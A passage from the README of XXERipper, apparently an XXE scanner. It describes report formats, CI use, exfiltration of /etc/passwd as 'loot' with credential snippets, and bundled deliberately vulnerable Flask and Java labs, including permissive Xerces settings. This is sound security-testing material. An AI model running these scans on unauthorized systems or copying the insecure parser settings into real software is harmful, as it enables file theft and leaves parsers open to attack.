            },
            "reasons": ["File fingerprint '/etc/passwd' matched (4 indicators)", "..."]
        }],
        "loot": [{
            "id": "file:9a1c...",
            "kind": "file",
            "source_path": "/etc/passwd",
            "technique": "XXE-INBAND-FILE-READ-linux-passwd",
            "content": "root:x:0:0:...",
            "size": 2841,
            "sha256": "...",
            "credentials": []
        }],
        "loot_counts": { "total": 1, "files": 1, "secrets": 0 },
        "oob_payloads_sent": 7,
        "oob_subdomains": ["xxe-dns-...oast.pro"],
        "oob_observations": [{"technique": "xxe-dns", "subdomain": "...", "note": "..."}]
    }]
}
```

The internal `skipped_phases` field is stripped from serialized JSON — it is bookkeeping for the terminal coverage report, not a finding.

### SARIF v2.1.0

Every finding ID becomes a SARIF rule with `helpUri` pointing at the primary CWE definition. Every finding becomes a result whose `artifactLocation.uri` is the target URL. Extra fields (`confidence`, `cwe`, `reasons`, `evidence`) ride in `result.properties`. Severity mapping: CRITICAL/HIGH → `error`, MEDIUM → `warning`, LOW/INFO → `note`.

### HTML report

`--report-html PATH` writes a single self-contained HTML file. No CDN links, no external images, no webfonts. Opens in any browser, renders identically offline, and prints cleanly.

Sections:

- **Executive summary** — targets scanned, vulnerable targets, highest severity, confirmed count, loot count.
- **Exploit chains** — one card per completed chain, with the stage flow and per-step evidence.
- **Extracted loot** — one card per file, with the full content and any extracted credentials. Each credential shows its fields and paste-ready shell snippets with individual copy buttons.
- **Findings by target** — a table per target with severity, ID, description, CWE, reasons, and structured evidence.
- **Print-friendly CSS** — the report renders to light-background ink-on-paper styling when printed.

The web console serves the same HTML report inline at `/api/jobs/<jid>/report.html` (via the **View HTML** button) and downloads it from `/api/jobs/<jid>/report.html.download` (via the **HTML** button).

### Console verdicts

| Verdict | Meaning |
|---|---|
| `[VULNERABLE]` | At least one finding with severity MEDIUM or above |
| `[MANUAL-OOB]` | No findings, but OOB payloads were sent (manual mode only) |
| `[INFO-ONLY]` | No findings, no OOB payloads, but at least one phase was skipped |
| `[OK]` | Nothing to report, nothing skipped |

```
[1/3] [VULNERABLE] https://target.com/api/xml
  Parser: libxml2
  [!] 3 phase(s) skipped:
        - multipart_docx, svg  (no --svg and no upload-shaped URL)
        - dos  (no --unsafe)
  [CRITICAL] [CWE-611,CWE-200] score=85 In-band XXE file read: /etc/passwd
      CWE: CWE-611 — Improper Restriction of XML External Entity Reference
      CWE: CWE-200 — Exposure of Sensitive Information to an Unauthorized Actor
      ↳ File fingerprint '/etc/passwd' matched (4 indicators)
      ↳ Full entity chain resolved
      ↳ 0 credential(s) extracted from /etc/passwd
```

---

## Reliability and Coverage

| Feature | Behavior |
|---|---|
| HTTP/2 negotiation | `build_session` constructs an `httpx.Client` with `http2=True`. The ALPN handshake negotiates HTTP/2 where the server supports it, falls back silently to HTTP/1.1 otherwise. No per-target configuration |
| Per-phase isolation | Every phase runs inside `_run_phase`, which catches any exception, logs the traceback under `--debug`, emits a `phase_error` event, and continues to the next phase |
| Rate limiting | `--rate N` enforces a minimum interval of `1/N` seconds between requests per target, applied by the shared `RateLimiter` instance that every send path consults. Independent of `--threads` |
| Retry and backoff | Transient failures (`ConnectError`, `RemoteProtocolError`, `ReadError`, `WriteError`, `TimeoutException`) retry three times with 0.5s, 0.75s, 1.125s backoff |
| Retry-After honoring | Respected on 429 and 503, capped at 10s |
| Null-response guard on OOB sends | A failed send skips the poll wait instead of stalling the scan |
| On-disk fingerprint cache | `~/.cache/xxeripper/fingerprints.json`. Repeat scans of the same URL skip the 9-probe sequence. Delete the file or pass `--no-fingerprint-cache` to invalidate |
| Wall-clock budget | `--budget SECONDS` — every phase checks `ctx.expired()` before each send and aborts cleanly |
| Cooperative cancellation | A `ScanContext.cancel()` call signals every phase. The web console exposes this via the **Stop** button |
| TLS toggle | Verification is off by default for pentest use; `--verify-tls` re-enables it |
| CI exit codes | 0 = clean, 1 = config error, 2 = finding at or above `--fail-on`, 130 = Ctrl-C |
| Thread-safe findings | `add_finding` is lock-guarded and merges duplicate IDs in place — bumping severity, ORing `confirmed`, taking `max(confidence)`, unioning reasons and evidence — rather than emitting duplicate entries. Every merge and every new finding emits an event so the web console updates live |
| Thread-safe OOB stats | `OOBClient.stats()` returns a locked snapshot so the CLI summary reads a consistent view even during a running phase |
| Deduplicated loot | `LootStore.add_file` and `LootStore.add_secret` key on the SHA-256 of the content. Two findings that recover the same file produce one loot entry |
| Coverage reporting | Per-target skip list with human-readable reasons; end-of-scan summary of targets with skips |
| Fingerprint cache in CI | Point `HOME` at a persisted cache directory to save 9 requests per run. Cache size is roughly 1 KB per URL |

The retry adapter deliberately does not retry HTTP 500 — error-based XXE targets return 500 on purpose, and retrying hides the signal.

---

## CI/CD Integration

### GitHub Actions

```yaml
- name: XXE scan
  run: xxeripper "$TARGET_URL" --oob-auto \
      --full-file-scan -o results --format both \
      --report-html results.html --fail-on high

- name: Upload SARIF
  if: always()
  uses: github/codeql-action/upload-sarif@v3
  with: { sarif_file: results.sarif, category: xxeripper }

- name: Upload HTML report
  if: always()
  uses: actions/upload-artifact@v4
  with: { name: xxe-report, path: results.html }
```

### GitLab CI

```yaml
xxe-scan:
  script:
    - xxeripper "$TARGET_URL" --oob-auto --full-file-scan \
        -o report --format both --fail-on medium
    - cp report.json gl-sast-report.json
  artifacts:
    reports: { sast: gl-sast-report.json }
    paths: [ report.html ]
    when: always
```

### Caching fingerprints in CI

```yaml
- uses: actions/cache@v4
  with:
    path: ~/.cache/xxeripper
    key: xxeripper-fingerprints-${{ github.ref }}
```

Cache size is roughly 1 KB per URL and stable between runs unless the target's parser changes.

**Auto OOB in CI.** `--oob-auto` requires `interactsh-client` in `PATH`. On GitHub-hosted runners, install it in a setup step:

```yaml
- name: Install interactsh-client
  run: |
    go install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
    echo "$HOME/go/bin" >> "$GITHUB_PATH"
```

If your CI environment blocks outbound DNS to arbitrary subdomains, use manual mode with a self-hosted Interactsh server your pipeline can reach.

**Blind exfiltration in CI.** For the exfiltration pipeline to produce loot entries, the CI runner must be reachable from the target. That usually means a self-hosted runner on a network the target can reach, or `--oob-dtd-dir` combined with an externally-served directory the target can fetch from. Interactsh alone won't work — it logs callbacks but does not serve content.

---

## Testing Against the Included Labs

XXERipper ships with two local test labs that run **real vulnerable parsers** on the same configurations production applications ship. They are not mocks — each exposes a specific technique so you can verify the scanner detects it correctly, and each includes false-positive bait endpoints so you can verify it *doesn't* over-report.

Both labs bind to `127.0.0.1` and read local files on request by design. **Never expose them to a network you do not own.**

### Lab inventory

| Lab | File | Stack | Port | What it proves |
|---|---|---|---|---|
| Python | `xxe_lab.py` | Flask + lxml → libxml2, httpx (HTTP/1.1 or HTTP/2 via ALPN) for all outbound entity fetches | `127.0.0.1:5000` | 54 endpoints across ten technique families, plus safe counterparts for every scoped technique and a verdicts API for automated scoring. Serves HTTP by default; TLS via `--https` / `--autocert` |
| Java | `xxe_lab.java` | `com.sun.net.httpserver` + Xerces | `127.0.0.1:5001` | Error-based XXE, which modern libxml2 blocks at the C level |

### Python lab — `xxe_lab.py`

Install the lab dependencies (isolated from the scanner's own requirements):

```bash
# If you install by hand rather than `make lab`:
pip install 'flask>=3.0,<4.0' 'lxml>=5.0' 'httpx[http2]>=0.27,<0.29' 'PyYAML>=6.0'
```

The lab pulls `httpx[http2]` for the same reason the scanner does — outbound entity fetches negotiate HTTP/2 via ALPN when the OOB collector or metadata endpoint speaks it, and fall back silently to HTTP/1.1 otherwise. Inbound Flask is HTTP/1.1 regardless.

```bash
make lab
python3 xxe_lab.py
# [*] XXE Test Lab v1 on http://127.0.0.1:5000
# [*] Default mode: realistic (override: X-Lab-Mode header or ?lab_mode=)
# [*] 54 endpoints registered
# [*] Verdicts API: GET /api/verdicts
# [*] Do NOT expose this to untrusted networks.
```

The lab exposes **54 endpoints** across three verdict classes: 36 `vuln`, 17 `safe`, 1 `fn` bait.

### TLS

The lab speaks HTTP by default. Three flags turn on TLS:

| Flag | Behaviour |
|---|---|
| `--https` | Serve over TLS. Reuses a cached self-signed cert if one exists under `$TMPDIR/xxe-lab-certs/`, otherwise generates one with `openssl`. Reusing the cached cert across restarts keeps any scanner-side TLS fingerprint stable. |
| `--autocert` | Serve over TLS with a **freshly generated** self-signed cert. Always runs `openssl` and overwrites the cached cert. Implies `--https`. Mutually exclusive with `--cert` / `--key`. |
| `--cert PATH` / `--key PATH` | Serve over TLS with a supplied PEM pair. Both must be given together. |

`--host` and `--port` override the bind address (default `127.0.0.1:5000`); `FLASK_HOST` and `FLASK_PORT` env vars are honoured as defaults.

```bash
python3 xxe_lab.py --autocert --port 8443
# [*] XXE Test Lab v1 on https://127.0.0.1:8443
# [*] TLS cert: /tmp/xxe-lab-certs/cert.pem  [generated (fresh)]
# [*] TLS key:  /tmp/xxe-lab-certs/key.pem
# [*] Self-signed — scanners must skip cert verification.
```

The cert generated is RSA-2048, 365-day, `CN=127.0.0.1`, `subjectAltName=IP:127.0.0.1,DNS:localhost` — no passphrase. Requires `openssl` on `PATH` (OpenSSL 1.1.1+ for `-addext`). If you need a cert without those constraints, pass `--cert` / `--key` instead.

### Two modes

The lab has two response modes, switchable per request:

**`realistic` (default)** — mimics a real application. Wrong Content-Type returns `415`, wrong shape falls through to the parser (soft gate) or returns a generic `400` (hard gate). No reason leak. The scanner has to distinguish "target rejected my payload" from "target accepted but didn't resolve" using response shape alone.

**`scoped`** — the deterministic legacy mode. Every out-of-scope body returns a stable `200 out of scope: <reason>` that parses nothing. Opt-in for regression suites where cross-technique false-positive vetoes must be exact.

Override per request with a header or a query parameter:

```
Header:      X-Lab-Mode: scoped   |   X-Lab-Mode: realistic
Query param: ?lab_mode=scoped     |   ?lab_mode=realistic
```

Precedence is header > query param > env default (`XXE_LAB_MODE`).

### Endpoint groups

**Unscoped vulnerable** — accept any XML, always parse with the vulnerable parser:

| Endpoint | What it exercises |
|---|---|
| `POST /xml/vulnerable` | In-band file read, content-type matrix, chain integrity |
| `POST /xml/blind` | Silent parser — resolves entities, never reflects (OOB only) |
| `POST /xml/error` | Error channel — returns parser tracebacks |
| `POST /xml/reflect` | Reflects raw body AND parses — exercises reflection veto |
| `POST /xml/timing` | Sleeps when the payload has an external SYSTEM entity — timing-based blind |

**In-band and delivery vectors**, **Envelopes**, **Encodings**, **Inclusion**, **Extended fetchers**, **File formats**, **Parameter entity and metadata**, and **Blind OOB** — the full endpoint list is available at <http://127.0.0.1:5000/api/endpoints> or in the lab's own UI at <http://127.0.0.1:5000/>.

### Safe counterparts

Every scoped vulnerable endpoint has a safe counterpart that runs the **same scope check** but parses with entities disabled and network access blocked. The naming is mechanical: `/xml/safe-form` mirrors `/xml/form`, `/xml/safe-xslt` mirrors `/xml/xslt`, and so on.

This design exists so the scanner's cross-technique false-positive veto can be tested end-to-end. Consider the form-encoded phase: the scanner sends form-encoded XML to every target it scans. Against `/xml/form` that produces a finding if the payload resolves. Against `/xml/safe-form` the same payload should produce nothing. Before the safe counterparts existed, a target like `/xml/safe` had no form-field scope check at all, so the form-encoded payload was accepted and parsed by a "safe" endpoint — a false positive that wasn't the scanner's fault but also wasn't distinguishable from one.

The safe counterparts close that hole. There are 13 of them:

```
/xml/safe-form          /xml/safe-query           /xml/safe-svg
/xml/safe-saml          /xml/safe-soap            /xml/safe-multipart
/xml/safe-docx          /xml/safe-xinclude        /xml/safe-xinclude-xml
/xml/safe-xslt          /xml/safe-xsd             /xml/safe-xsd-import
/xml/safe-pi
```

Plus the four baseline baits that don't take scope checks at all:

```
/xml/safe               /xml/noise
/xml/stripped           /xml/safe-metadata
```

And one false-negative bait:

```
/xml/silent
```

A correct scanner reports `[OK]` on all seventeen. Any finding on them is a scanner bug, not a finding.

### Machine-readable verdicts

The lab exposes `GET /api/verdicts`, a JSON map from `"<method> <path>"` to one of `"vuln"`, `"safe"`, or `"fn"`:

```json
{
  "POST /xml/vulnerable": "vuln",
  "POST /xml/safe": "safe",
  "POST /xml/silent": "fn",
  ...
}
```

This is the hook for automated scoring. A test harness can capture the scanner's findings per endpoint, diff against the verdict map, and compute precision and recall without parsing HTML or reading endpoint metadata.

### Java lab — `xxe_lab.java`

```bash
java xxe_lab.java
# [*] Java XXE lab on http://127.0.0.1:5001
```

Single endpoint: `POST /xml/error`. Returns `parsed ok` on success, or `XML parse error: <message>` on failure — matching a vulnerable Java application that logs `str(e)`.

The Java lab remains necessary for the error-based XXE phase. libxml2 2.13 and later blocks external DTD access by default, so `XXE-ERROR-BASED-MALFORMED` cannot fire against the Python lab. Xerces permits internal-subset parameter entities and fires the finding without any local DTD at all. The lab enables the necessary features explicitly:

```java
dbf.setFeature("http://xml.org/sax/features/external-general-entities", true);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", true);
dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", true);
dbf.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, "all");
dbf.setAttribute(XMLConstants.ACCESS_EXTERNAL_SCHEMA, "all");
```

> **Note:** `ACCESS_EXTERNAL_DTD = ""` (empty string) means *deny all*, not allow all. Use `"all"` for a permissive parser.

### Local-DTD attack — install DTDs on the target

`error_based_local_dtd` works by hijacking a DTD that already exists on the target's filesystem. The scanner's payload list references ~60 common paths, but the technique cannot fire against a filesystem with none of them present — and the scanner correctly reports no finding in that case.

Install DTD packages on the same host running the Python lab so the technique has something to hijack:

```bash
# Fedora / RHEL / CentOS
sudo dnf install docbook-dtds xml-common w3c-dtd-xhtml

# Debian / Ubuntu
sudo apt install docbook-xml docbook-xsl xml-core w3c-dtd-xhtml

# Arch / Manjaro
sudo pacman -S docbook-xml docbook-xsl
```

**Windows** ships WMI DTDs (`C:\Windows\System32\wbem\xml\`) and Office DTDs (`C:\Program Files\Common Files\microsoft shared\OFFICE*\mso.dll`) by default.

**macOS** ships `/System/Library/DTDs/PropertyList.dtd` and `sdef.dtd` by default.

**A note on libxml2 2.13+.** Modern libxml2 tightened the rules further: a hijackable DTD must declare the parameter entity by name, reference it at the top level, and not chain into modules with forbidden nested PEs. The DocBook `docbookx.dtd` files fail on modern libxml2 because they include `dbcentx.mod`, which contains forbidden nested PEs. `fonts.dtd` parses cleanly but does not declare the entities the scanner tries to hijack.

This is why the **Java lab is the recommended environment** for demonstrating error-based XXE.

### Running the full test suite

Every example below uses `http://127.0.0.1:5000`. To run the same scans against the lab over TLS, start it with `--autocert` (or `--https` to reuse the cached cert) and point the scanner at `https://127.0.0.1:5000`. The scanner disables TLS verification by default, so no scanner-side flag is needed — a self-signed cert works without `--verify-tls` being left off.

```bash
python3 xxe_lab.py --autocert &
xxeripper https://127.0.0.1:5000/xml/vulnerable --oob-auto --no-fingerprint-cache
```

**Option A — manual OOB.** Two terminals:

**Terminal A** — start the OOB client and note the session domain:

```bash
interactsh-client -v
# [INF] c5f2a9b4e1d8a3f72c0b.oast.pro
```

**Terminal B** — run the lab and the scans:

```bash
# Python lab, full coverage
python3 xxe_lab.py &
xxeripper http://127.0.0.1:5000/xml/vulnerable \
    --oob-domain c5f2a9b4e1d8a3f72c0b.oast.pro \
    --timing --unsafe --full-file-scan --no-fingerprint-cache

# False-positive checks — every one must print [OK]
for p in safe safe-form safe-query safe-svg safe-saml safe-soap \
         safe-multipart safe-docx safe-xinclude safe-xinclude-xml \
         safe-xslt safe-xsd safe-xsd-import safe-pi \
         noise stripped safe-metadata; do
    xxeripper "http://127.0.0.1:5000/xml/${p}" --no-fingerprint-cache
done

# Java lab, error-based XXE
java xxe_lab.java
xxeripper http://127.0.0.1:5001/xml/error --no-fingerprint-cache
```

**Option B — auto OOB.** One terminal:

```bash
python3 xxe_lab.py &
xxeripper http://127.0.0.1:5000/xml/vulnerable \
    --oob-auto --timing --unsafe --full-file-scan --no-fingerprint-cache
```

**Option C — deterministic regression.** Set `XXE_LAB_MODE=scoped` before starting the lab. Every out-of-scope request returns an identical body, so the scanner's no-change veto fires deterministically and per-endpoint results are reproducible across runs. Set `XXE_LAB_NOISE_SEED=1` to make `/xml/noise` reproducible too.

**Option D — exfiltration.** To exercise the blind-exfiltration path end-to-end:

```bash
python3 xxe_lab.py &
xxeripper http://127.0.0.1:5000/xml/oob-external-dtd \
    --oob-auto \
    --oob-listen 127.0.0.1:8888 \
    --oob-public-url http://127.0.0.1:8888 \
    --no-fingerprint-cache

# Loot tab should now show /etc/passwd with paste-ready snippets
```

In the WebUI: start the console with `--serve --host 0.0.0.0`, tick **Serve DTDs from this WebUI** in the drawer, supply the WebUI's public URL, and the same exfil path works without a second process.

### Interpreting coverage gaps

The scanner's per-target skip list shows exactly what was not tested. Pass the named flag to enable a skipped phase:

```
[!] 4 phase(s) skipped:
      - multipart_docx, svg  (no --svg and no upload-shaped URL)
      - dos  (no --unsafe)
      - saml_presig  (no SAML-shaped URL segment)
      - waf_bypass  (no --bypass-waf)
```

| Skipped phase | Enable with |
|---|---|
| `multipart_docx`, `svg` | `--svg` |
| `dos` | `--unsafe` |
| `timing` | `--timing` |
| `saml_presig` | `--saml` |
| `waf_bypass` | `--bypass-waf` |
| Any OOB phase | `--oob-domain` or `--oob-auto` |
| Blind exfiltration | `--oob-auto` plus `--oob-listen` / `--oob-dtd-dir` (or the WebUI-hosted server) |
| `fingerprint` | *(do not pass `--no-fingerprint`)* |
| — (file list change) | `--full-file-scan` |

---

## Building, License, and Credits

### Building from source

**Prerequisites:** Python 3.9+, `build` and `hatchling` for Python packaging; `makepkg`, `dpkg-buildpackage`/`debhelper`/`dh-python`, `rpmbuild` for distribution packages.

| Target | Command | Output |
|---|---|---|
| Python wheel and sdist | `make build` | `dist/*.whl`, `dist/*.tar.gz` |
| Debian | `make deb` | `dist/xxeripper_*.deb` |
| RPM | `make rpm` | `dist/xxeripper-*.rpm` |
| Arch | `make arch` | `dist/xxeripper-*.pkg.tar.zst` |
| Everything | `make all` | All of the above |

### License

XXERipper is free software, licensed under the **GNU General Public License** v3 or later. Distributed **without any warranty**. See <https://www.gnu.org/licenses/> for details.

Copyright (C) 2026 Kamal Khalilov.

### Disclaimer

XXERipper is intended for **authorized security testing only**. Do not use against systems you do not own or have explicit written permission to test. Unauthorized scanning may violate the CFAA (US), the Computer Misuse Act (UK), similar laws in your jurisdiction, and cloud provider terms of service. The authors are not responsible for misuse and provide this tool for educational and legitimate security testing purposes only.

The web console has no authentication and should not be exposed to untrusted networks. Keep it bound to `127.0.0.1` (the default), or front it with an authenticated reverse proxy.

### Credits

**Author:** Kamal Khalilov — [@kamalx06](https://github.com/kamalx06) · kamalx06github@gmail.com

**Acknowledgments:** Interactsh by ProjectDiscovery · PortSwigger Web Security Academy · HackTricks · mohemiv (error-based XXE research) · ShadowProbe (baselining inspiration) · CWE by MITRE · SARIF by OASIS · the open-source security community.

**Built with:** Python · httpx · Flask · Hatchling · Interactsh · SARIF

---

<p align="center">
    <strong>XXERipper</strong><br>
    <em>Scan smarter. Report accurately. Stay legal.</em>
</p>

<p align="center">
    <a href="https://github.com/kamalx06/XXERipper">GitHub</a> •
    <a href="https://github.com/kamalx06/XXERipper/issues">Issues</a> •
    <a href="https://github.com/kamalx06/XXERipper/releases">Releases</a> •
    <a href="https://www.gnu.org/licenses/gpl-3.0">License</a>
</p>